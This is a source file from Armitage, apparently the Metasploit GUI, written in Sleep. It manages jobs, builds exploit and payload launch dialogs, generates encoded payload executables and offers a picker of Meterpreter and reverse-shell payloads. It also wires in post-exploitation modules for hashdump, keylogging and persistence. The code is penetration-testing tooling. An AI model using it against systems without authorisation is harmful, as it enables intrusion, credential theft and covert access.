#
# code to manage some jobs ;)
#

import msf.*;
import armitage.*;
import console.*;
import table.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

import java.awt.*;
import java.awt.event.*;
import ui.*;

sub manage_proxy_server {
	launch_dialog("SOCKS Proxy", "auxiliary", "server/socks4a", 1);
}

sub find_job {
	#
	# convoluted? yes, but jobs.info kept locking up on some of my requests...
	#
	cmd_safe("jobs", lambda({
		local('$temp $jid $jname $confirm');

		foreach $temp (split("\n", $3)) {
			if ([$temp trim] ismatch '.*?(\d+)\s+(.*?)') {
				($jid, $jname) = matched();	

				if ($jname eq $name) {
					[$function: $jid];
					return;
				}
			}
		}
		[$function: -1];
	}, $name => $1, $function => $2));
}

sub generatePayload {
	local('$file');
	$file = saveFile2();
	if ($file is $null) {
		return;
	}

	thread(lambda({
		local('$module $options $format $handle $data');
		($module, $options, $format) = $args;
		$options["Format"] = $format;
		$data = call($client, "module.execute", "payload", $module, $options);

		if ($data !is $null) {
			$handle = openf("> $+ $file");
			writeb($handle, $data["payload"]);
			closef($handle);

			showError("Saved $file");
		}
	}, $args => @_, \$file));
}

# pass the module launch to another thread please.
sub launch_service {
	if ($4 eq "payload" && $format ne "multi/handler") {
		generatePayload($2, $3, $format);
	}
	else {
		local('$listener');
		thread(lambda({
			local('$title $module $options $type');
			($title, $module, $options, $type) = $args;
			_launch_service($title, $module, $options, $type, \$format, \$listener);
		}, $args => @_, \$format, \$listener));
	}
}

sub _launch_service {
	local('$c $key $value %options');
	%options = copy($3);

	if ('SESSION' in $3) {
		$c = createDisplayTab($1, $host => sessionToHost($3['SESSION']), $file => "post");
	}
	else if ('RHOST' in $3) {
		$c = createDisplayTab($1, $host => $3['RHOST'], $file => $4);
	}
	else {
		$c = createDisplayTab($1, $file => $4);
	}

	if ($listener) {
		[$c addSessionListener: $listener];
	}

	if ($4 eq "payload" && $format eq "multi/handler") {
		[$c addCommand: $null, "use exploit/multi/handler"];
		%options['PAYLOAD'] = substr($2, 8);
		%options['ExitOnSession'] = 'false';
	}
	else {
		[$c addCommand: $null, "use $2"];	
	}

	[$c setOptions: %options];
	
	if ($4 eq "exploit" || ($4 eq "payload" && $format eq "multi/handler")) {
		[$c addCommand: "x", "exploit -j"];
	}
	else {
		[$c addCommand: "x", "run -j"];
	}

	[$c start];
}

#
# pop up a dialog to start our attack with... fun fun fun
#

# launch_dialog("title", "type", "name", "visible", "hosts...", %options)
sub launch_dialog {
	local('$info $options $6');
	$info = call($mclient, "module.info", $2, $3);
	$options = call($mclient, "module.options", $2, $3);

	# give callers the ability to set any options before we pass things on.
	if (-ishash $6) {
		local('$key $value');
		foreach $key => $value ($6) {
			if ($key in $options) {
				$options[$key]["default"] = $value;
				$options[$key]["advanced"] = "0";
			}
		}
	}

	dispatchEvent(lambda({
		invoke(lambda(&_launch_dialog, \$info, \$options), $args);
	}, \$info, \$options, $args => @_));
}

# $1 = model, $2 = exploit, $3 = selected target
sub updatePayloads {
	thread(lambda({
		local('$best');
		$best = best_client_payload($exploit, $target);
		[$model setValueForKey: "PAYLOAD", "Value", $best];
		[$model setValueForKey: "LHOST", "Value", $MY_ADDRESS];
		[$model setValueForKey: "LPORT", "Value", randomPort()];
		[$model setValueForKey: "DisablePayloadHandler", "Value", "false"];
		[$model setValueForKey: "ExitOnSession", "Value", "false"];
		[$model fireListeners];
	}, $model => $1, $exploit => $2, $target => $3));
}

sub _launch_dialog {
	local('$dialog $north $center $center $label $textarea $scroll $model $table $default $combo $key $sorter $value $col $button $6 $5');

	$dialog = dialog($1, 520, 360);

	$north = [new JPanel];
	[$north setLayout: [new BorderLayout]];
	
	$label = [new JLabel: $info["name"]];
	[$label setBorder: [BorderFactory createEmptyBorder: 5, 5, 5, 5]];

	[$north add: $label, [BorderLayout NORTH]];

	$textarea = [new JTextArea: [join(" ", split('[\\n\\s]+', $info["description"])) trim]];
	[$textarea setEditable: 0];
	[$textarea setOpaque: 1];
	[$textarea setLineWrap: 1];
	[$textarea setWrapStyleWord: 1];
	[$textarea setBorder: [BorderFactory createEmptyBorder: 3, 3, 3, 3]];
	$scroll = [new JScrollPane: $textarea];
	[$scroll setBorder: [BorderFactory createEmptyBorder: 3, 3, 3, 3]];

	[$north add: $scroll, [BorderLayout CENTER]];

	$model = [new GenericTableModel: @("Option", "Value"), "Option", 128];
	[$model setCellEditable: 1];
	foreach $key => $value ($options) {
		if ($key eq "THREADS") {
			$default = "24";
		}
		else if ($key eq "LHOST") {
			$default = $MY_ADDRESS;
		}
		else if ($key eq "LPORT" && $value['default'] eq '4444') {
			$default = randomPort();
		}
		else if ($key eq "RHOSTS" && size($5) > 0) {
			$default = join(", ", $5);
		}
		else if ($key eq "SESSION" && size($5) > 0) {
			local('$host @sessions');

			foreach $host ($5) {
				if ($host in %hosts && 'sessions' in %hosts[$host] && size(%hosts[$host]['sessions']) > 0) {
					push(@sessions, keys(%hosts[$host]['sessions'])[0]);
				}
			}
			$default = join(", ", @sessions);
		}
		else if ($key eq "RHOST" && size($5) > 0) {
			$default = $5[0];
		}
		else {
			$default = $value["default"];
		}

		if ($2 ne "exploit" || "$key" !in @("DisablePayloadHandler", "PAYLOAD", "LHOST", "LPORT", "ExitOnSession")) {
			[$model _addEntry: %(Option => $key, Value => $default, Tooltip => $value["desc"], Hide => iff($value["advanced"] eq '0' && $value["evasion"] eq '0', '0', '1'))]; 
		}
	}

	#
	# give user the option to configure the client-side payload... of course we'll configure it for them
	# by default :P~
	#
	if ($2 eq "exploit") {
		[$model _addEntry: %(Option => "PAYLOAD", Value => "", Tooltip => "The payload to execute on successful exploitation", Hide => "0")]; 
		[$model _addEntry: %(Option => "DisablePayloadHandler", Value => "1", Tooltip => "Disable the handler code for the selected payload", Hide => "0")]; 
		[$model _addEntry: %(Option => "ExitOnSession", Value => "", Tooltip => "Close this handler after a session")];
		[$model _addEntry: %(Option => "LHOST", Value => "$MY_ADDRESS", Tooltip => "The listen address", Hide => "0")]; 
		[$model _addEntry: %(Option => "LPORT", Value => "", Tooltip => "The listen port", Hide => "0")]; 
	}
	else if ($2 eq "payload" && "*windows*" iswm $3) {
		[$model _addEntry: %(Option => "Template", Value => "", Tooltip => "The executable template to use", Hide => "0")];
		[$model _addEntry: %(Option => "KeepTemplateWorking", Value => "", Tooltip => "Keep the executable template functional", Hide => "0")];
		[$model _addEntry: %(Option => "Iterations", Value => "3", Tooltip => "The number of encoding iterations", Hide => "0")];
		[$model _addEntry: %(Option => "Encoder", Value => "x86/shikata_ga_nai", Tooltip => "The name of the encoder module to use", Hide => "0")];
	}

	$table = [new ATable: $model];
	$sorter = [new TableRowSorter: $model];
	[$sorter toggleSortOrder: 0];
	[$table setRowSorter: $sorter];

	local('%actions');
	%actions["PAYLOAD"] = lambda(&payloadHelper, $exploit => $3, \$model);

	addFileListener($table, $model, %actions);

	local('$TABLE_RENDERER');
	$TABLE_RENDERER = tableRenderer($table, $model);

	foreach $col (@("Option", "Value")) {
		[[$table getColumn: $col] setCellRenderer: $TABLE_RENDERER];
	}

	$center = [new JScrollPane: $table];
	$combo = select(sorta(split(',', "raw,ruby,rb,perl,pl,c,js_be,js_le,java,dll,exe,exe-small,elf,macho,vba,vba-exe,vbs,loop-vbs,asp,war,multi/handler")), "multi/handler");
	$button = [new JButton: "Launch"];

	# setup some default options on a output type basis.
	[$combo addActionListener: lambda({
		local('$sel');
		$sel = [$combo getSelectedItem];
		if ($sel eq "vba") {
			[$model setValueForKey: "Encoder", "Value", "generic/none"];
			[$model setValueForKey: "EXITFUNC", "Value", "thread"];
			[$model fireListeners];
		}
	}, \$model, \$combo)];

	local('$combobox');
	if ('targets' in $info) {
		$combobox = targetsCombobox($info);
		[$combobox addActionListener: lambda({
			updatePayloads($model, $exploit, [$combobox getSelectedItem]);
		}, \$model, $exploit => $3, \$combobox)];
	}

	[$button addActionListener: lambda({
		local('$options $host $x $best');
		syncTable($table);

		$options = %();

		# assume we have an exploit... set the appropriate target please...
		if ($combobox !is $null) {
			$options["TARGET"] = split(' \=\> ', [$combobox getSelectedItem])[0];
		}

		for ($x = 0; $x < [$model getRowCount]; $x++) {
			if ([$model getValueAt: $x, 1] ne "") { 
				$options[ [$model getValueAt: $x, 0] ] = [$model getValueAt: $x, 1];
			}
		}

		if (!isShift($1)) {
			[$dialog setVisible: 0];
		}
	
		# fix some module options...
		if ($command eq "windows/manage/persistence") {
			if ('REXE' in $options) {
				$options['ACTION'] = 'REXE';
			}
			else {
				$options['ACTION'] = 'TEMPLATE';
			}
		}

		# it's go time buddy... time to filter some stuff...
		($type, $command, $options) = filter_data("user_launch", $type, $command, $options);

		if ($visible) {
			if ('SESSION' in $options) {
				local('@sessions $session $console');
				@sessions = split(',\s+', $options['SESSION']);
				foreach $session (@sessions) {
					$options['SESSION'] = $session;
					launch_service($title, "$type $+ / $+ $command", copy($options), $type, $format => [$combo getSelectedItem]);
				}

				if ($command eq "windows/gather/smart_hashdump" || $command eq "windows/gather/hashdump") {
					foreach $session (@sessions) {
						$session = sessionToHost($session);
					}
		                        elog("dumped hashes on " . join(", ", @sessions));
				}
				else if ($command eq "windows/gather/arp_scanner") {
					elog("ARP scan: " . $options['RHOSTS']  . " via " . join(", ", @sessions));
				}
				else if ($command eq "multi/gather/ping_sweep") {
					elog("ping sweep: " . $options['RHOSTS']  . " via " . join(", ", @sessions));
				}
				else if ($command eq "windows/capture/keylog_recorder") {
					foreach $session (@sessions) {
						$session = sessionToHost($session) . "/ $+ $session";
					}
		                        elog("started logging keystrokes on " . join(", ", @sessions));
				}
				else if ($command eq "windows/manage/persistence") {
					foreach $session (@sessions) {
						$session = sessionToHost($session);
					}
		                        elog("ran persistence on " . join(", ", @sessions));
				}
			}
			else if ("*/fileformat/*" iswm $command && 'FILENAME' in $options) {
				local('$listener');
				$listener = {
					local('$temp $file $path');
					foreach $temp (split("\n", $3)) {
						if ($temp ismatch '... (.*?) stored at (.*)') {
							($file, $path) = matched();
							downloadFile($path, saveFile2());
						}
					}					
				};

				if ($client is $mclient) {
					$listener = $null;
				}
		
				launch_service($title, "$type $+ / $+ $command", $options, $type, $format => [$combo getSelectedItem], \$listener);
			}
			else if ($type eq "exploit" && "*/browser/*" iswm $command) {
				local('$listener');
				$listener = lambda({
					local('$temp $file $path');
					foreach $temp (split("\n", $3)) {
						if ($temp ismatch '...\s+Local IP:\s+(http.*)') {
							elog("launched $command @ " . matched()[0]);
						}
					}					
				}, \$command);

				if ($client is $mclient) {
					$listener = $null;
				}
		
				launch_service($title, "$type $+ / $+ $command", $options, $type, $format => [$combo getSelectedItem], \$listener);
			}
			else {
				if ($type eq "auxiliary" && $command eq "gather/enum_dns") {
					local('$domain $ns');
					($domain, $ns) = values($options, @('DOMAIN', 'NS'));
					if ($ns ne "") {
						elog("launched DNS enum for $domain via $ns"); 
					}
					else {
						elog("launched DNS enum for $domain");
					}
				}
				else if ($type eq "auxiliary" && $command eq "server/socks4a") {
					local('$host $port');
					($host, $port) = values($options, @('SRVHOST', 'SRVPORT'));
					elog("started SOCKS proxy server at $host $+ : $+ $port");
				}

				launch_service($title, "$type $+ / $+ $command", $options, $type, $format => [$combo getSelectedItem]);
			}
		}
		else {
			call_async($client, "module.execute", $type, $command, $options);
			elog("started $command");
			showError("Started service");
		}
	}, \$dialog, \$model, $title => $1, $type => $2, $command => $3, $visible => $4, \$combo, \$table, \$combobox)];

	local('$advanced');
	$advanced = addAdvanced(\$model);

	local('$panel');
	$panel = [new JPanel];
	[$panel setLayout: [new BoxLayout: $panel, [BoxLayout Y_AXIS]]];

	if ($2 eq "payload") {
		[$panel add: left([new JLabel: "Output: "], $combo)];
	}
	else if ($combobox !is $null) {
		[$panel add: left([new JLabel: "Targets: "], $combobox)];
	}

	if ($2 eq "exploit") {
		updatePayloads($model, "$3", iff($combobox !is $null, [$combobox getSelectedItem]));
	}

	[$panel add: left($advanced)];
	[$panel add: center($button)];
	[$dialog add: $panel, [BorderLayout SOUTH]];

	local('$s');
	$s = [new JSplitPane: [JSplitPane VERTICAL_SPLIT], $north, $center];
	[$center setPreferredSize: [new Dimension: 0, 0]];
	[$north setPreferredSize: [new Dimension: 480, 87]]; # from 67...
	[$s resetToPreferredSizes];
	[$s setOneTouchExpandable: 1];  

	[$dialog add: $s, [BorderLayout CENTER]];

	[$button requestFocus];

	[$dialog setVisible: 1];
}

sub jobs {
	local('$jobs $jid $desc $info $data @r');
	$jobs = call($client, "job.list");
	foreach $jid => $desc ($jobs) {
		$info = call($client, "job.info", $jid);
		if ($info !is $null) {
			$data = $info["datastore"];
			if (!-ishash $data) { $data = %(); }
			push(@r, %(Id => $jid, Name => $info['name'], Payload => $data['PAYLOAD'], Port => $data['LPORT'], Start => rtime($info['start_time']), Data => $data, URL => $info['uripath']));
		}
	}
	return @r;
}

sub updateJobsTable {
	local('$job');
	[$model clear: 8];

	foreach $job (jobs()) {
		[$model addEntry: $job];
	}

	[$model fireListeners];
}

sub createJobsTab {	
	local('$table $model $refresh $kill $panel $jobsf $sorter');
	
	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];

	$model = [new GenericTableModel: @("Id", "Name", "Payload", "Port", "URL", "Start"), "Id", 8];

	$table = [new ATable: $model];
	[[$table getSelectionModel] setSelectionMode: [ListSelectionModel MULTIPLE_INTERVAL_SELECTION]];
	[[$table getColumn: "Id"] setPreferredWidth: 125];
	[[$table getColumn: "Port"] setPreferredWidth: 200];
	[[$table getColumn: "Name"] setPreferredWidth: 1024];
	[[$table getColumn: "Payload"] setPreferredWidth: 1024];
	[[$table getColumn: "URL"] setPreferredWidth: 1024];
	[[$table getColumn: "Start"] setPreferredWidth: 1024];

        $sorter = [new TableRowSorter: $model];
        [$sorter toggleSortOrder: 0];
        [$table setRowSorter: $sorter];
        [$sorter setComparator: 0, { return $1 <=> $2; }];
        [$sorter setComparator: 3, { return $1 <=> $2; }];

	$jobsf = lambda(&updateJobsTable, \$model);
	thread($jobsf);

	[$panel add: [new JScrollPane: $table], [BorderLayout CENTER]];
	
	$refresh = [new JButton: "Refresh"];
	[$refresh addActionListener: lambda({ thread($jobsf); }, \$jobsf)];

	$kill = [new JButton: "Kill"];
	[$kill addActionListener: lambda({
		local('@jobs');
		@jobs = [$model getSelectedValues: $table];

		thread(lambda({
			showError("Stopping " . size(@jobs) . " job" . iff(size(@jobs) == 1, "", "s"));
			local('$jid');
			foreach $jid (@jobs) {
				call($client, "job.stop", $jid);
			}
			yield size(@jobs) * 500;
			[$jobsf];
		}, \@jobs, \$jobsf));
	}, \$table, \$model, \$jobsf)];

	[$panel add: center($refresh, $kill), [BorderLayout SOUTH]];

	[$frame addTab: "Jobs", $panel, $null];
}		

sub payloadHelper {
	local('$compatible $payload $check');

	$payload = { 
		return %(payload => $1, Name => $2, Target => $3, Channel => $4);
	};

	$check = [new JCheckBox: "Start a handler for this payload"];

	$compatible = @();
	push($compatible, [$payload: "windows/meterpreter/reverse_tcp", "Meterpreter", "Windows", "TCP/IP"]);
	push($compatible, [$payload: "windows/meterpreter/reverse_tcp_dns", "Meterpreter", "Windows", "TCP/IP to hostname"]);
	push($compatible, [$payload: "windows/meterpreter/reverse_ipv6_tcp", "Meterpreter", "Windows", "TCP/IPv6"]);
	push($compatible, [$payload: "windows/meterpreter/reverse_http", "Meterpreter", "Windows", "HTTP"]);
	push($compatible, [$payload: "windows/meterpreter/reverse_https", "Meterpreter", "Windows", "HTTPS"]);

	push($compatible, [$payload: "windows/shell/reverse_tcp", "Shell", "Windows", "TCP/IP"]);
	push($compatible, [$payload: "windows/shell/reverse_http", "Shell", "Windows", "HTTP"]);
	push($compatible, [$payload: "windows/shell/reverse_ipv6_tcp", "Shell", "Windows", "TCP/IPv6"]);
	push($compatible, [$payload: "windows/shell/reverse_ipv6_http", "Shell", "Windows", "HTTP/IPv6"]);

	push($compatible, [$payload: "java/meterpreter/reverse_tcp", "Meterpreter", "Java", "TCP/IP"]);
	push($compatible, [$payload: "java/meterpreter/reverse_http", "Meterpreter", "Java", "HTTP"]);
	push($compatible, [$payload: "java/shell/reverse_tcp", "Shell", "Java", "TCP/IP"]);

	push($compatible, [$payload: "linux/meterpreter/reverse_tcp", "Meterpreter", "Linux", "TCP/IP"]);
	push($compatible, [$payload: "linux/meterpreter/reverse_ipv6_tcp", "Meterpreter", "Linux", "TCP/IPv6"]);
	push($compatible, [$payload: "osx/ppc/shell/reverse_tcp", "Shell", "MacOS X (PPC)", "TCP/IP"]);
	push($compatible, [$payload: "osx/x86/vforkshell/reverse_tcp", "Shell", "MacOS X (x86)", "TCP/IP"]);
	push($compatible, [$payload: "generic/shell_reverse_tcp", "Shell", "UNIX (Generic)", "TCP/IP"]);
	
	quickListDialog("Choose a payload", "Select", @("payload", "Name", "Target", "Channel"), $compatible, $width => 640, $height => 240, $after => @(left($check)), lambda({
		# set the payload...
		if ($1 eq "") {
			return;
		}

		if ([$check isSelected]) {
			[$model setValueForKey: "DisablePayloadHandler", "Value", "false"];
			[$model setValueForKey: "HANDLER", "Value", "true"];
			[$model setValueForKey: "ExitOnSession", "Value", "false"];
			[$model setValueForKey: "LPORT", "Value", randomPort()];
		}
		else {
			[$model setValueForKey: "DisablePayloadHandler", "Value", "true"];
			[$model setValueForKey: "HANDLER", "Value", "false"];
			[$model setValueForKey: "ExitOnSession", "Value", ""];
			[$model setValueForKey: "LPORT", "Value", ""];
		}

		if ($1 eq "windows/meterpreter/reverse_tcp" || $1 eq "windows/meterpreter/reverse_tcp_dns") {
			[$model setValueForKey: "PAYLOAD", "Value", $1];
			[$model setValueForKey: "LHOST", "Value", $MY_ADDRESS];
		}
		else if ($1 eq "windows/meterpreter/reverse_http" || $1 eq "windows/meterpreter/reverse_https" || $1 eq "java/meterpreter/reverse_http") {
			[$model setValueForKey: "PAYLOAD", "Value", $1];
			[$model setValueForKey: "LHOST", "Value", $MY_ADDRESS];
			[$model setValueForKey: "LPORT", "Value", iff([$1 endsWith: "http"], "80", "443")];
		}
		else {
			[$model setValueForKey: "PAYLOAD", "Value", $1];
		}
		[$model fireListeners];
	}, $callback => $4, \$model, \$check));
}
